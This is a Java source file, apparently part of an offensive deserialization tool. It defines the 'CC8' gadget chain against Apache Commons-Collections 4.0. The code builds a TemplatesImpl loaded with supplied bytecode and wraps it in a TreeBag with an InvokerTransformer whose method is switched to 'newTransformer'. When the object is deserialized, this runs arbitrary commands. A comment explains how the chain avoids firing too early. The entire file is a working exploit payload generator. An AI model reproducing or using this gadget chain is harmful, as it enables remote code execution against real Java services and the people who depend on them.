package com.bcvgh.core.unser.gadgets.exec;

import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.bcvgh.core.unser.annotation.DependenciesVersion;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.gadgets.CustomPayload;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Comparator;

import static com.bcvgh.core.unser.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-4.0")
@RequireParameter("Command")
public class CC8 implements CustomPayload {
    @Override
    public <T> Object getObject(UnSerInput unSerInput) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "xxx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{unSerInput.getBytecode()});

        //先传入一个transformer,其iMethodName为人畜无害的toString,避免add时就弹计算器
        Transformer transformer = new InvokerTransformer("toString", null, null);

        Comparator comparator = new TransformingComparator(transformer);
        TreeBag treeBag = new TreeBag(comparator);
        treeBag.add(templates);

        setFieldValue(transformer,"iMethodName","newTransformer");
        return treeBag;
    }

//    public static byte[] getBytecode(final Class classname) throws NotFoundException, IOException, CannotCompileException {
//        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz =
//                pool.get(classname.getName());
////        JavaClass cls = Repository.lookupClass(classname);
////        byte[] bytes = cls.getBytes();
//        byte[] bytes = clazz.toBytecode();
//        return bytes;
//    }
}

